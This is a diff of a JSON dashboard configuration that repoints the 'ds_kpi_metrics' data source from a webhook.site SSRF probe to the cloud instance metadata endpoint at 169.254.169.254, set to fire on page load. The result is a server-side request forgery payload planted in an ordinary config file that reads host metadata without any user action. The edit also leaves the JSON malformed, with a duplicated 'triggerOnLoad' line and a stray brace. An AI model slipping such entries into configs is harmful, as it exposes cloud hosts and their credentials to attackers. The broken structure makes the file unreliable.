@@ -58,11 +58,13 @@
         },
         "triggerOnLoad": true
       },
-      "ds_kpi_metrics": {
-        "type": "url",
-        "config": {
-          "url": "https://webhook.site/71cac033-2499-404d-88dc-cd5014af3d63/?ssrf_test=1"
-        },
+"ds_kpi_metrics": {
+  "type": "url",
+  "config": {
+    "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+  },
+  "triggerOnLoad": true
+},
         "triggerOnLoad": true
       },
       "ds_sales_by_category": {
